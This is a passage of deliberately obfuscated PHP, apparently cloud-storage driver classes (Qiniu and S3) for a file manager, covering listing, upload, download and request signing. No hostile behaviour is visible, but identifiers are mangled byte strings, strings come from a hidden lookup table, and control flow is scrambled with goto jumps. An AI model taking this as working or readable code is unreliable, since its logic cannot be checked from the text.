(empty($Fã±˜¶›øå)) { $Fã±˜¶›øå = $this->objectMeta($DĞóøà„); if (!$Fã±˜¶›øå) { return $béê‡ò»Ş; } } goto E¿×µÆ; E¿×µÆ: if (isset($Fã±˜¶›øå[$bé¥ß’—†ò[1338]])) { $béê‡ò»Ş[$bé¥ß’—†ò[84]] = substr($Fã±˜¶›øå[$bé¥ß’—†ò[1338]] . $bé¥ß’—†ò[33], 0, 10); } if (isset($Fã±˜¶›øå[$bé¥ß’—†ò[1337]])) { $béê‡ò»Ş[$bé¥ß’—†ò[78]] = $Fã±˜¶›øå[$bé¥ß’—†ò[1337]]; } return $béê‡ò»Ş; goto e—ŒŸ—ñá†; e—ŒŸ—ñá†: } public function folderInfo($Dáª¥«œ³ì, $CêŒ²½”Î¤ = false) { goto aÒ …ù³¤»; D¶¦×ºéâ: $fô†Ú‚Š¿æ[$fÒğ’ù•ĞÚ[194]] = $fô†Ú‚Š¿æ[$fÒğ’ù•ĞÚ[84]] = 0; $fô†Ú‚Š¿æ[$fÒğ’ù•ĞÚ[195]] = $fô†Ú‚Š¿æ[$fÒğ’ù•ĞÚ[196]] = !0; $Dáª¥«œ³ì = rtrim($Dáª¥«œ³ì, $fÒğ’ù•ĞÚ[8]) . $fÒğ’ù•ĞÚ[8]; goto D‚÷­çˆªÔ; D‚÷­çˆªÔ: $B•†¤ë¸Ûš = $this->objectMeta($Dáª¥«œ³ì); if (isset($B•†¤ë¸Ûš[$fÒğ’ù•ĞÚ[1338]])) { $fô†Ú‚Š¿æ[$fÒğ’ù•ĞÚ[84]] = substr($B•†¤ë¸Ûš[$fÒğ’ù•ĞÚ[1338]] . $fÒğ’ù•ĞÚ[33], 0, 10); } return $fô†Ú‚Š¿æ; goto eØØõ›È† ; aÒ …ù³¤»: $fÒğ’ù•ĞÚ =& $_SERVER[Ö‘Øù]; $fô†Ú‚Š¿æ = array($fÒğ’ù•ĞÚ[28] => $this->pathThis($Dáª¥«œ³ì), $fÒğ’ù•ĞÚ[76] => $this->getPathOuter($fÒğ’ù•ĞÚ[8] . $Dáª¥«œ³ì), $fÒğ’ù•ĞÚ[29] => $fÒğ’ù•ĞÚ[77]); if ($CêŒ²½”Î¤) { return $fô†Ú‚Š¿æ; } goto D¶¦×ºéâ; eØØõ›È† : } public function listPath($CíÄ£Ã¶©Š, $BÁ¦—°íã = false) { $bƒ¤„…¿†Ò =& $_SERVER[Ö‘Øù]; $DóÃ˜˜ƒ÷í = $this->fileList($CíÄ£Ã¶©Š, $bƒ¤„…¿†Ò[8], !0); foreach ($DóÃ˜˜ƒ÷í[$bƒ¤„…¿†Ò[75]] as $E•æ“Êñ‰æ => $f»¹ã¶ÒÃ) { $DóÃ˜˜ƒ÷í[$bƒ¤„…¿†Ò[75]][$E•æ“Êñ‰æ] = $this->folderInfo($f»¹ã¶ÒÃ, $BÁ¦—°íã); } foreach ($DóÃ˜˜ƒ÷í[$bƒ¤„…¿†Ò[74]] as $E•æ“Êñ‰æ => $f»¹ã¶ÒÃ) { $DóÃ˜˜ƒ÷í[$bƒ¤„…¿†Ò[74]][$E•æ“Êñ‰æ] = $this->fileInfo($f»¹ã¶ÒÃ[$bƒ¤„…¿†Ò[93]], $BÁ¦—°íã, $f»¹ã¶ÒÃ); } return $DóÃ˜˜ƒ÷í; } public function has($fšœ±÷¿Ÿ, $cŞ¥óƒ˜èâ = false, $cŸ¼Åè‰Ìç = true) { goto Bšğ²È¡ç¢; céÊÀ¢Õ‘¥: $dÃº¼ƒâ÷ = $eÖ”¡¸Ó¾ = 0; while (!0) { check_abort(); list($D‰ÅàåŞë, $aö×ÌÒ²¢) = $this->bucketManager->listFiles($this->bucket, $AĞª·À‹”, $B¯¤ñ³ª , $c¾ÃßóÚ…, $E…’‰ Œö); if ($aö×ÌÒ²¢) { break; } $B¯¤ñ³ª  = array_key_exists($eË´›ÌàŞÈ[1308], $D‰ÅàåŞë) ? $B¯¤ñ³ª  = $D‰ÅàåŞë[$eË´›ÌàŞÈ[1339]] : $eË´›ÌàŞÈ[33]; if ($cŞ¥óƒ˜èâ) { if (!empty($D‰ÅàåŞë[$eË´›ÌàŞÈ[1340]])) { $dÃº¼ƒâ÷ += count($D‰ÅàåŞë[$eË´›ÌàŞÈ[1340]]); } if (!empty($D‰ÅàåŞë[$eË´›ÌàŞÈ[1341]])) { $eÖ”¡¸Ó¾ += count($D‰ÅàåŞë[$eË´›ÌàŞÈ[1341]]); } if ($B¯¤ñ³ª  === $eË´›ÌàŞÈ[33]) { break; } continue; } if ($cŸ¼Åè‰Ìç) { if (!empty($D‰ÅàåŞë[$eË´›ÌàŞÈ[1340]])) { return !0; } } else { if (!empty($D‰ÅàåŞë[$eË´›ÌàŞÈ[1341]])) { return !0; } } if ($B¯¤ñ³ª  === $eË´›ÌàŞÈ[33]) { break; } } if ($cŞ¥óƒ˜èâ) { return array($eË´›ÌàŞÈ[203] => $dÃº¼ƒâ÷, $eË´›ÌàŞÈ[204] => $eÖ”¡¸Ó¾); } goto C†ÜˆİÙ”ã; C†ÜˆİÙ”ã: return !1; goto bÓì‚è²ğ; dŸ§ÒŒ: $B¯¤ñ³ª  = $eË´›ÌàŞÈ[33]; $c¾ÃßóÚ… = 500; $E…’‰ Œö = $eË´›ÌàŞÈ[8]; goto céÊÀ¢Õ‘¥; Bšğ²È¡ç¢: $eË´›ÌàŞÈ =& $_SERVER[Ö‘Øù]; $fšœ±÷¿Ÿ = trim($fšœ±÷¿Ÿ, $eË´›ÌàŞÈ[8]); $AĞª·À‹” = empty($fšœ±÷¿Ÿ) && $fšœ±÷¿Ÿ !== $eË´›ÌàŞÈ[191] ? $eË´›ÌàŞÈ[33] : $fšœ±÷¿Ÿ . $eË´›ÌàŞÈ[8]; goto dŸ§ÒŒ; bÓì‚è²ğ: } public function listAll($dååŞ¤µ) { $CóòºŸ©¥Î =& $_SERVER[Ö‘Øù]; $AØŸ“…ÏÆ‰ = $this->fileList($dååŞ¤µ, $CóòºŸ©¥Î[33], !0); $a—È™Úáñç = array(); foreach ($AØŸ“…ÏÆ‰[$CóòºŸ©¥Î[74]] as $C¿ÇŞ×‘ë) { $a—È™Úáñç[$C¿ÇŞ×‘ë[$CóòºŸ©¥Î[93]]] = $C¿ÇŞ×‘ë[$CóòºŸ©¥Î[78]]; } foreach ($AØŸ“…ÏÆ‰[$CóòºŸ©¥Î[75]] as $C¿ÇŞ×‘ë) { if (is_string($C¿ÇŞ×‘ë)) { $a—È™Úáñç[$C¿ÇŞ×‘ë] = 0; } } return $this->listAllFiles($dååŞ¤µ, array_keys($a—È™Úáñç), $a—È™Úáñç); } private function fileList($dâºïò·®Û, $d»‹í´‚£Ñ = '', $e¶…·¸°®Ñ = 0) { goto bÉó×¨Å¬‰; bÉó×¨Å¬‰: $a…Ù•ò À¾ =& $_SERVER[Ö‘Øù]; $dâºïò·®Û = trim($dâºïò·®Û, $a…Ù•ò À¾[8]); $cÓ«é‚•… = empty($dâºïò·®Û) && $dâºïò·®Û !== $a…Ù•ò À¾[191] ? $a…Ù•ò À¾[33] : $dâºïò·®Û . $a…Ù•ò À¾[8]; goto A¨‰ñÕ±÷®; a„«†”ìïŸ: $aìöêÎÁø‡ = $f¿†ôÊÈôÖ = array(); while (!0) { check_abort(); list($Eßßêğƒ¿Ç, $E‘ñÃ¿ÖíÕ) = $this->bucketManager->listFiles($this->bucket, $cÓ«é‚•…, $C„Ï„óÎíÕ, $dµª˜õ™Ô , $d»‹í´‚£Ñ); if ($E‘ñÃ¿ÖíÕ) { break; } $C„Ï„óÎíÕ = array_key_exists($a…Ù•ò À¾[1308], $Eßßêğƒ¿Ç) ? $C„Ï„óÎíÕ = $Eßßêğƒ¿Ç[$a…Ù•ò À¾[1339]] : $a…Ù•ò À¾[33]; $A¿ˆ»’Î• = isset($Eßßêğƒ¿Ç[$a…Ù•ò À¾[1340]]) ? $Eßßêğƒ¿Ç[$a…Ù•ò À¾[1340]] : array(); $A¹„éï®±ß = isset($Eßßêğƒ¿Ç[$a…Ù•ò À¾[1341]]) ? $Eßßêğƒ¿Ç[$a…Ù•ò À¾[1341]] : array(); foreach ($A¿ˆ»’Î• as $Eª¬ºÒ—–á) { goto Bä²…ÎÔì; c ‚›è•Ä¼: if ($eÓÜƒâ‚îê) { $aìöêÎÁø‡[] = $fÉÈ®òêö«; continue; } $f¿†ôÊÈôÖ[] = $e¶…·¸°®Ñ ? $Eª¬ºÒ—–á : $fÉÈ®òêö«; goto CÔŠ»¸ÙÀ; cçÒÆèÃóË: $Eª¬ºÒ—–á[$a…Ù•ò À¾[78]] = $f©Ú‰ø†°Ï; $eÓÜƒâ‚îê = $f©Ú‰ø†°Ï == 0 && substr($fÉÈ®òêö«, strlen($fÉÈ®òêö«) - 1, 1) == $a…Ù•ò À¾[8] ? !0 : !1; if ($DÏ×ˆÉ¬ô) { $this->cacheMethod($a…Ù•ò À¾[199], $fÉÈ®òêö«, $eÓÜƒâ‚îê); $this->cacheMethod($a…Ù•ò À¾[200], $fÉÈ®òêö«, $Eª¬ºÒ—–á); } goto c ‚›è•Ä¼; Bä²…ÎÔì: if ($Eª¬ºÒ—–á[$a…Ù•ò À¾[93]] == $cÓ«é‚•…) { continue; } $fÉÈ®òêö« = $Eª¬ºÒ—–á[$a…Ù•ò À¾[93]]; $f©Ú‰ø†°Ï = $Eª¬ºÒ—–á[$a…Ù•ò À¾[1337]]; goto cçÒÆèÃóË; CÔŠ»¸ÙÀ: } foreach ($A¹„éï®±ß as $fÉÈ®òêö«) { if ($fÉÈ®òêö« == $cÓ«é‚•…) { continue; } $aìöêÎÁø‡[] = $fÉÈ®òêö«; if ($DÏ×ˆÉ¬ô) { $this->cacheMethod($a…Ù•ò À¾[199], $fÉÈ®òêö«, !0); } } if ($C„Ï„óÎíÕ === $a…Ù•ò À¾[33]) { break; } } if ($DÏ×ˆÉ¬ô) { $this->cacheMethod($a…Ù•ò À¾[199], $dâºïò·®Û, !0); } goto E”ÏöÓ©ÆÃ; A¨‰ñÕ±÷®: $C„Ï„óÎíÕ = $a…Ù•ò À¾[33]; $dµª˜õ™Ô  = 1000; $DÏ×ˆÉ¬ô = $this->listItemCache === !1 ? !1 : !0; goto a„«†”ìïŸ; E”ÏöÓ©ÆÃ: return array($a…Ù•ò À¾[75] => $aìöêÎÁø‡, $a…Ù•ò À¾[74] => $f¿†ôÊÈôÖ); goto CÂš¦Áë÷Œ; CÂš¦Áë÷Œ: } public function canRead($d¾Û¦Š‰Ğä) { return $this->exist($d¾Û¦Š‰Ğä) ? !0 : !1; } public function canWrite($c¬¨¶ñàâÊ) { return $this->exist($c¬¨¶ñàâÊ) ? !0 : !1; } public function getContent($eª³ÍŠº‘­) { return $this->fileSubstr($eª³ÍŠº‘­, 0, -1); } public function setContent($f‘—Òƒ»èË, $E‹˜Ïƒ‰Üò = '') { $EèÛ÷áï¼ = $this->tempFile($this->pathThis($f‘—Òƒ»èË)); file_put_contents($EèÛ÷áï¼, $E‹˜Ïƒ‰Üò); if ($this->upload($f‘—Òƒ»èË, $EèÛ÷áï¼)) { $this->tempFileRemve($EèÛ÷áï¼); return !0; } return !1; } public function refreshUrls($B¸áöÄõÙ) { goto D¿ÆÒ¦Ù‡»; D¿ÆÒ¦Ù‡»: $añóŠœÃ±® =& $_SERVER[Ö‘Øù]; $A†µÒÁì…„ = array(); if (is_array($B¸áöÄõÙ)) { foreach ($B¸áöÄõÙ as $aÀ¬ÜöÉ¾×) { $A†µÒÁì…„[] = $this->link($aÀ¬ÜöÉ¾×); } } else { $A†µÒÁì…„[] = $this->link($B¸áöÄõÙ); } goto C½±§ƒìö; d³¿Œğ: return $dõé‰–¢¨[$añóŠœÃ±®[1112]] == $añóŠœÃ±®[753] ? !0 : !1; goto fĞƒİ‹‡Ğ·; C½±§ƒìö: $bÀ…Š«±´ = new Qiniu\Cdn\CdnManager($this->auth); list($dõé‰–¢¨, $A°¥é™Ê‚á) = $bÀ…Š«±´->refreshUrls($A†µÒÁì…„); if ($A°¥é™Ê‚á) { return !1; } goto d³¿Œğ; fĞƒİ‹‡Ğ·: } public function fileSubstr($D¥¾ğªïš, $eÎËÛŒ¦íğ, $b®Áñ­èåÚ) { $cªª¹¨ˆ…Ø =& $_SERVER[Ö‘Øù]; if (!($cÓÂ½ƒ• = $this->link($D¥¾ğªïš))) { return !1; } $E†ˆ”õ‚Ñ = !1; if ($b®Áñ­èåÚ > 0) { $eÕ‰¥ĞÒš = $eÎËÛŒ¦íğ + $b®Áñ­èåÚ - 1; $E†ˆ”õ‚Ñ = array($cªª¹¨ˆ…Ø[1342] . $eÎËÛŒ¦íğ . $cªª¹¨ˆ…Ø[455] . $eÕ‰¥ĞÒš); } $A¦öóÍ¿—· = url_request($cÓÂ½ƒ•, $cªª¹¨ˆ…Ø[228], !1, $E†ˆ”õ‚Ñ); return $A¦öóÍ¿—·[$cªª¹¨ˆ…Ø[743]] ? $A¦öóÍ¿—·[$cªª¹¨ˆ…Ø[1122]] : !1; } public function upload($DËÖ—¸õ‚Æ, $b½©õù—‹, $Eøœ„áğé = false, $BÉÑ†µ Èà = REPEAT_REPLACE) { $C–å¾œ»å = new Qiniu\Storage\UploadManager(); $bõè„¹º« = $this->auth->uploadToken($this->bucket, $DËÖ—¸õ‚Æ); $døö…Ú——† = get_file_mime(get_path_ext($b½©õù—‹)); list($e‘ø·î”¨‚, $Fë©™ïŒ±) = $C–å¾œ»å->putFile($bõè„¹º«, $DËÖ—¸õ‚Æ, $b½©õù—‹, null, $døö…Ú——†); return $Fë©™ïŒ± ? !1 : $this->getPathOuter($DËÖ—¸õ‚Æ); } public function uploadFormData($D£”µ¹ŒÄ¯, $då±çæ´²¶ = 3600) { return $this->uploadToken($D£”µ¹ŒÄ¯, $då±çæ´²¶); } public function multiUploadFormData($eã‘ñ¤›ê, $e±ç‹ƒÃİ = 3600) { return $this->uploadToken($eã‘ñ¤›ê, $e±ç‹ƒÃİ); } private function uploadToken($a†¾ß¢‹Ò, $b¹·ÂÛ©äÓ = 3600) { goto dËÄíŠù”; AªÄ„Ñ¡¤: $f¶ÔÂ†õËÛ = http_type() . "\x3a\57\57\165\160\154\157\x61\144{$F¤®Èñ‚}\56\x71\x69\156\151\x75\160\56\143\x6f\155\x2f"; return array($FêàçÉ°ëÒ[1346] => $Dˆ‘ÆÅôáÄ, $FêàçÉ°ëÒ[1347] => $f¶ÔÂ†õËÛ); goto Fî­²‘„; dËÄíŠù”: $FêàçÉ°ëÒ =& $_SERVER[Ö‘Øù]; $EƒàÌ§˜Õ™ = $b¹·ÂÛ©äÓ; $ağİåÎ¥ = array($FêàçÉ°ëÒ[1343] => $FêàçÉ°ëÒ[1344]); goto aÓ°°õÌ‡º; aÓ°°õÌ‡º: $e°‘†Š¶ = $a†¾ß¢‹Ò; $Dˆ‘ÆÅôáÄ = $this->auth->uploadToken($this->bucket, $e°‘†Š¶, $EƒàÌ§˜Õ™, $ağİåÎ¥, !0); $F¤®Èñ‚ = empty($this->region) || $this->region == $FêàçÉ°ëÒ[1345] ? $FêàçÉ°ëÒ[33] : $FêàçÉ°ëÒ[455] . $this->region; goto AªÄ„Ñ¡¤; Fî­²‘„: } public function download($EßŠÇ´çÑ, $cĞÙŠ‡ÓËŒ) { goto fŒ¡Ş¾©ò³; bšâš¿ìƒ—: $dæ‚öĞ¤ôÁ = 1024 * 200; $D­ğ¦àŒ­§ = fopen($c¤ÜÀÂ£µË, $_SERVER[Ö‘Øù][1348]); while (!0) { $e·¡ìÇ¥Å = $this->fileSubstr($EßŠÇ´çÑ, $c„™·èÀõ”, $dæ‚öĞ¤ôÁ); if ($e·¡ìÇ¥Å === !1) { return !1; } fwrite($D­ğ¦àŒ­§, $e·¡ìÇ¥Å); $c„™·èÀõ” += $dæ‚öĞ¤ôÁ; if (strlen($e·¡ìÇ¥Å) < $dæ‚öĞ¤ôÁ) { break; } } goto bª„åòª¯; fŒ¡Ş¾©ò³: $c¤ÜÀÂ£µË = IO::getPathInner(IO::mkfile($cĞÙŠ‡ÓËŒ)); if (!($fÜ¢ÅÀÆ¥ = $this->link($EßŠÇ´çÑ))) { return !1; } $c„™·èÀõ” = 0; goto bšâš¿ìƒ—; bª„åòª¯: fclose($D­ğ¦àŒ­§); return $cĞÙŠ‡ÓËŒ; goto c¡ÜñÙÍÀ‹; c¡ÜñÙÍÀ‹: } public function link($e¥Ôò”÷ã¸, $aîŒ‹˜ïŞè = '') { if (!$this->isFile($e¥Ôò”÷ã¸)) { return !1; } $E°¡¶Ó¦ = $this->getHost() . $_SERVER[Ö‘Øù][8] . $this->pathEncode($e¥Ôò”÷ã¸) . $aîŒ‹˜ïŞè; return $this->auth->privateDownloadUrl($E°¡¶Ó¦, 3600 * 12); } public function fileOut($AŒ³ãÌ°ğê, $fÍªŒÛÚºÑ = false, $e’¬êÀÈÑŒ = false, $AÕœ¥§¹‡ê = '') { $FğÙòğÌŞÓ =& $_SERVER[Ö‘Øù]; if ($this->isFileOutServer()) { return $this->fileOutServer($AŒ³ãÌ°ğê, $fÍªŒÛÚºÑ, $e’¬êÀÈÑŒ, $AÕœ¥§¹‡ê); } if (!$e’¬êÀÈÑŒ) { $e’¬êÀÈÑŒ = $this->pathThis($AŒ³ãÌ°ğê); } $b°£¢‘§½ = $fÍªŒÛÚºÑ ? $FğÙòğÌŞÓ[1349] . rawurlencode($e’¬êÀÈÑŒ) : $FğÙòğÌŞÓ[33]; $A‘ÛÁäçàõ = $this->link($AŒ³ãÌ°ğê, $b°£¢‘§½); $this->fileOutLink($A‘ÛÁäçàõ); } public function fileOutServer($f¿•¯‰î¬Œ, $aĞœœ£‡èÇ = false, $a‰ó›‡Ï‚­ = false, $e‹„¿ÑÛ•“ = '') { parent::fileOut($f¿•¯‰î¬Œ, $aĞœœ£‡èÇ, $a‰ó›‡Ï‚­, $e‹„¿ÑÛ•“); } public function fileOutImage($EÓ…×Ó¬–˜, $E¯¬ì‘Ö¶ = 250) { $déÊ…‡¡º = $this->link($EÓ…×Ó¬–˜, $_SERVER[Ö‘Øù][1350] . $E¯¬ì‘Ö¶); $this->fileOutLink($déÊ…‡¡º); } public function fileOutImageServer($F†µË†«óŠ, $e·­ÙÆçƒå = 250) { parent::fileOutImage($F†µË†«óŠ, $e·­ÙÆçƒå); } public function hashMd5($A„…¸¡Ë›è) { $eĞ…²Ó‘‘ =& $_SERVER[Ö‘Øù]; $DÛ´½ŒÉŠ = $this->objectMeta($A„…¸¡Ë›è); return isset($DÛ´½ŒÉŠ[$eĞ…²Ó‘‘[208]]) ? $DÛ´½ŒÉŠ[$eĞ…²Ó‘‘[208]] : !1; $b¹Š˜¿ï = $this->link($A„…¸¡Ë›è, $eĞ…²Ó‘‘[1351]); } public function size($E†ÕâÄêñ…) { $F‹ç·Ï¼Ïì = $this->objectMeta($E†ÕâÄêñ…); return $F‹ç·Ï¼Ïì ? $F‹ç·Ï¼Ïì[$_SERVER[Ö‘Øù][78]] : 0; } public function info($A˜®×µŸØ—) { if ($this->isFolder($A˜®×µŸØ—)) { return $this->folderInfo($A˜®×µŸØ—); } else { if ($this->isFile($A˜®×µŸØ—)) { return $this->fileInfo($A˜®×µŸØ—); } } return !1; } public function exist($FÑçëÍ×à) { return $this->isFile($FÑçëÍ×à) || $this->isFolder($FÑçëÍ×à); } public function isFile($F»µ£¬”‡) { return !$this->isFolder($F»µ£¬”‡) && $this->objectMeta($F»µ£¬”‡); } public function isFolder($B±«ë„´¦´) { return $this->cacheMethod($_SERVER[Ö‘Øù][199], $B±«ë„´¦´); } protected function objectMeta($cóÏÎàêÜ) { return $this->cacheMethod($_SERVER[Ö‘Øù][200], $cóÏÎàêÜ); } protected function _objectMeta($fâÖ‰†ÎĞÁ) { $E–ÜŞöâ÷ì =& $_SERVER[Ö‘Øù]; list($eƒ£Ò‹ùö, $Cì‰¾Æ¾†) = $this->bucketManager->stat($this->bucket, $fâÖ‰†ÎĞÁ); if ($eƒ£Ò‹ùö) { $eƒ£Ò‹ùö[$E–ÜŞöâ÷ì[78]] = intval($eƒ£Ò‹ùö[$E–ÜŞöâ÷ì[1337]]); } return $eƒ£Ò‹ùö; } protected function _isFolder($e‡Ş†Àöğ‹) { $d†Ê¹ì©÷ =& $_SERVER[Ö‘Øù]; if ($e‡Ş†Àöğ‹ == $d†Ê¹ì©÷[33] || $e‡Ş†Àöğ‹ == $d†Ê¹ì©÷[8]) { return !0; } list($DÉ‡ø¶Ã§å, $fÜ£ã©ñ ´) = $this->bucketManager->listFiles($this->bucket, trim($e‡Ş†Àöğ‹, $d†Ê¹ì©÷[8]) . $d†Ê¹ì©÷[8], $d†Ê¹ì©÷[33], 1, $d†Ê¹ì©÷[8]); return !empty($DÉ‡ø¶Ã§å[$d†Ê¹ì©÷[1340]]) || !empty($DÉ‡ø¶Ã§å[$d†Ê¹ì©÷[1341]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($dÚ„æÄÓ¼£) { parent::__construct($dÚ„æÄÓ¼£); } public function uploadFormData($aÄ›ÒÛƒ¿«, $f½¨Á¼Ó¿ = 3600) { goto A‚Û´¦”¶ï; A‚Û´¦”¶ï: $FáÂØ­é„ =& $_SERVER[Ö‘Øù]; $DÁ‚ø‹Ò = $FáÂØ­é„[192]; $bÑŞ¥¥»ª = $FáÂØ­é„[1258]; goto cˆ‡­‘ŠÂá; d´éÜä‹™: $DµŒ”‰‡”ç = base64_encode(json_encode($f„Ò“‹Ö§é)); $E¤©±°ãÀÒ = hash_hmac($FáÂØ­é„[1268], $EˆÙÛ³¸ï, $FáÂØ­é„[1269] . $this->secret, !0); $fÓ±¸¿­·· = hash_hmac($FáÂØ­é„[1268], $this->region, $E¤©±°ãÀÒ, !0); goto DÛÇÈæĞÉæ; fÓÛ‰Ôñíä: $E»¨ÜßòŞõ = array($FáÂØ­é„[211] => $FáÂØ­é„[33], $FáÂØ­é„[1270] => $FáÂØ­é„[33], $FáÂØ­é„[1227] => $DÁ‚ø‹Ò, $FáÂØ­é„[1231] => $bÌ¤°ÄÜÊ, $FáÂØ­é„[1235] => $DµŒ”‰‡”ç, $FáÂØ­é„[1271] => $Eœ£­íù“, $FáÂØ­é„[1272] => $bÑŞ¥¥»ª, $FáÂØ­é„[1273] => $E‰ñÃ‚Ü¤Ÿ, $FáÂØ­é„[1274] => $aÌëÄ°Ÿ†œ, $FáÂØ­é„[1275] => $b¢Óç±ãğ¼, $FáÂØ­é„[175] => $this->getHost()); return $E»¨ÜßòŞõ; goto d‹ÜâĞî±³; cˆ‡­‘ŠÂá: $CëñÁ¥¥«‹ = $FáÂØ­é„[59]; $E‰ñÃ‚Ü¤Ÿ = gmdate($FáÂØ­é„[1259]); $EˆÙÛ³¸ï = gmdate($FáÂØ­é„[744]); goto c«İÓšİÑÔ; DÛÇÈæĞÉæ: $dØ™‘ÂÆ‘Â = hash_hmac($FáÂØ­é„[1268], $CëñÁ¥¥«‹, $fÓ±¸¿­··, !0); $DÖÒˆÓ„æŞ = hash_hmac($FáÂØ­é„[1268], $fÓšÉ‡ëÈ, $dØ™‘ÂÆ‘Â, !0); $b¢Óç±ãğ¼ = hash_hmac($FáÂØ­é„[1268], $DµŒ”‰‡”ç, $DÖÒˆÓ„æŞ); goto fÓÛ‰Ôñíä; c«İÓšİÑÔ: $fÓšÉ‡ëÈ = $FáÂØ­é„[1260]; $aÌëÄ°Ÿ†œ = $f½¨Á¼Ó¿ . $FáÂØ­é„[33]; $bÌ¤°ÄÜÊ = $FáÂØ­é„[1223]; goto Fä–×ç‡; Fä–×ç‡: $DĞãÜñˆ Ñ = array($this->accessKey, $EˆÙÛ³¸ï, $this->region, $CëñÁ¥¥«‹, $fÓšÉ‡ëÈ); $Eœ£­íù“ = implode($FáÂØ­é„[8], $DĞãÜñˆ Ñ); $f„Ò“‹Ö§é = array($FáÂØ­é„[1225] => gmdate($FáÂØ­é„[1224], strtotime($FáÂØ­é„[1261])), $FáÂØ­é„[1226] => array(array($FáÂØ­é„[1228] => $this->bucket), array($FáÂØ­é„[1227] => $DÁ‚ø‹Ò), array($FáÂØ­é„[1229], $FáÂØ­é„[1230], $FáÂØ­é„[33]), array($FáÂØ­é„[1229], $FáÂØ­é„[1262], $FáÂØ­é„[33]), array($FáÂØ­é„[1229], $FáÂØ­é„[1263], $FáÂØ­é„[33]), array($FáÂØ­é„[1231] => $bÌ¤°ÄÜÊ), array($FáÂØ­é„[1264] => $Eœ£­íù“), array($FáÂØ­é„[1265] => $bÑŞ¥¥»ª), array($FáÂØ­é„[1266] => $E‰ñÃ‚Ü¤Ÿ), array($FáÂØ­é„[1267] => $aÌëÄ°Ÿ†œ))); goto d´éÜä‹™; d‹ÜâĞî±³: } public function multiUploadFormData($DÊ´Å… Ã¿, $dñìŠ´ôè  = 3600) { $BŠÖÈœ²¯ =& $_SERVER[Ö‘Øù]; $Bİñ¸Š©áº = gmdate($BŠÖÈœ²¯[1352]); $BÄ¡ÁÜáó« = array(); $c•‹˜²¦µÈ = $this->client->getUploadId($this->bucket, $DÊ´Å… Ã¿, $BÄ¡ÁÜáó«); if (!$c•‹˜²¦µÈ) { return !1; } return array($BŠÖÈœ²¯[221] => $c•‹˜²¦µÈ, $BŠÖÈœ²¯[175] => $this->getHost() . $BŠÖÈœ²¯[8] . $this->pathEncode($DÊ´Å… Ã¿), $BŠÖÈœ²¯[222] => $Bİñ¸Š©áº, $BŠÖÈœ²¯[93] => $DÊ´Å… Ã¿); } public function multiUploadAuthData($d ÑÏÕ¸…º, $CÚµ“‰¢ƒ… = array()) { goto C¹‡Ëƒ—Ùí; A´İñáöáí: if (strpos($eöµ˜Şêã—, $A›ñÆÂÇ«Ñ[225]) === 0) { if (isset($AĞãÍÊ­š¿[$A›ñÆÂÇ«Ñ[1354]])) { $dìì‰¡˜ÛÃ = $AĞãÍÊ­š¿[$A›ñÆÂÇ«Ñ[1354]]; } else { if (isset($eâÙ¶Ğ¿«ª[$A›ñÆÂÇ«Ñ[1354]])) { $dìì‰¡˜ÛÃ = $eâÙ¶Ğ¿«ª[$A›ñÆÂÇ«Ñ[1354]]; } else { $dìì‰¡˜ÛÃ = hash($A›ñÆÂÇ«Ñ[1268], $A›ñÆÂÇ«Ñ[33]); } } return array($A›ñÆÂÇ«Ñ[232] => $eâÙ¶Ğ¿«ª[$A›ñÆÂÇ«Ñ[232]], $A›ñÆÂÇ«Ñ[1354] => $dìì‰¡˜ÛÃ, $A›ñÆÂÇ«Ñ[222] => $eâÙ¶Ğ¿«ª[$A›ñÆÂÇ«Ñ[1357]]); } return $eâÙ¶Ğ¿«ª[$A›ñÆÂÇ«Ñ[232]]; goto e‚·ä¿ËÒ‹; C¹‡Ëƒ—Ùí: $A›ñÆÂÇ«Ñ =& $_SERVER[Ö‘Øù]; $eöµ˜Şêã— = isset($CÚµ“‰¢ƒ…[$A›ñÆÂÇ«Ñ[168]]) ? $CÚµ“‰¢ƒ…[$A›ñÆÂÇ«Ñ[168]] : $A›ñÆÂÇ«Ñ[33]; $e‰ŸŠğŸšÁ = $CÚµ“‰¢ƒ…[$A›ñÆÂÇ«Ñ[93]]; goto D¤á´¯‘ŞÑ; bÉ‘Úììò: $d…®Ç¿…İí = $A›ñÆÂÇ«Ñ[226]; $B™àÅ¹ˆ = $A›ñÆÂÇ«Ñ[8] . $this->pathEncode($e‰ŸŠğŸšÁ) . $eöµ˜Şêã—; $eâÙ¶Ğ¿«ª = $this->client->__getSignatureV4($AĞãÍÊ­š¿, $c ŠŠƒçÂš, $d…®Ç¿…İí, $B™àÅ¹ˆ); goto A´İñáöáí; D¤á´¯‘ŞÑ: unset($CÚµ“‰¢ƒ…[$A›ñÆÂÇ«Ñ[93]]); if (isset($CÚµ“‰¢ƒ…[$A›ñÆÂÇ«Ñ[223]])) { return $this->listUploadParts($e‰ŸŠğŸšÁ, $CÚµ“‰¢ƒ…); } $AĞãÍÊ­š¿ = array(); goto FçëÅ‹Ç; FçëÅ‹Ç: if (isset($CÚµ“‰¢ƒ…[$A›ñÆÂÇ«Ñ[1353]])) { $AĞãÍÊ­š¿[$A›ñÆÂÇ«Ñ[1354]] = $CÚµ“‰¢ƒ…[$A›ñÆÂÇ«Ñ[1353]]; } $BÅ”•¯áä = explode($A›ñÆÂÇ«Ñ[177], $this->getHost()); $c ŠŠƒçÂš = array($A›ñÆÂÇ«Ñ[1355] => $BÅ”•¯áä[1], $A›ñÆÂÇ«Ñ[1356] => $A›ñÆÂÇ«Ñ[33], $A›ñÆÂÇ«Ñ[211] => $A›ñÆÂÇ«Ñ[119], $A›ñÆÂÇ«Ñ[1270] => $CÚµ“‰¢ƒ…[$A›ñÆÂÇ«Ñ[78]]); goto bÉ‘Úììò; e‚·ä¿ËÒ‹: } public function listUploadParts($cÒ˜ ÜàÌ, $e”©ŠĞ ²¯ = array()) { goto a²Ê¡©×Í; a²Ê¡©×Í: $aä¯ø‘… =& $_SERVER[Ö‘Øù]; $d¯•Ù—œ•Œ = str_replace($aä¯ø‘…[233], $aä¯ø‘…[33], $e”©ŠĞ ²¯[$aä¯ø‘…[168]]); $c‰©Çøí²ğ = $this->client->listParts($this->bucket, $cÒ˜ ÜàÌ, $d¯•Ù—œ•Œ); goto e¥óà÷ò¬; e´Ú«ğî°Ç: $aƒó©É£ = array($aä¯ø‘…[1355] => $D ×”Ì‡ğ…[1], $aä¯ø‘…[211] => $aä¯ø‘…[119], $aä¯ø‘…[1270] => strlen($bóì«áóÄ)); $AÍÈÀÙ‡·å = $aä¯ø‘…[224]; $CæÀ½× ˆ´ = $aä¯ø‘…[8] . $this->pathEncode($cÒ˜ ÜàÌ) . $e”©ŠĞ 